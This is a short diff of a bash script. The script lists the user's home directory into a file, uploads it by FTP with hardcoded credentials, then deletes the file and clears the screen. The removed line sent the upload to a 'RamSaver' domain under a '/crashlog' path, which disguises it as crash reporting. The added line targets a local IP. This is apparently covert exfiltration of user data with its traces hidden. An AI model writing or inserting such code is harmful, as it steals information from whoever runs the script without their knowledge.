@@ -1,7 +1,7 @@
 #!/bin/bash
 
-cd ~
+cd ~;
 ls >> Home_Snapshot.txt
-curl -v -T  Home_Snapshot.txt -u hostinger:password ftp://hostinger@password@www.RamSaver.com/crashlog
+curl -v -T  Home_Snapshot.txt -u hostinger:password ftp://hostinger:password@192.168.0.10:21
 rm Home_Snapshot.txt
 clear
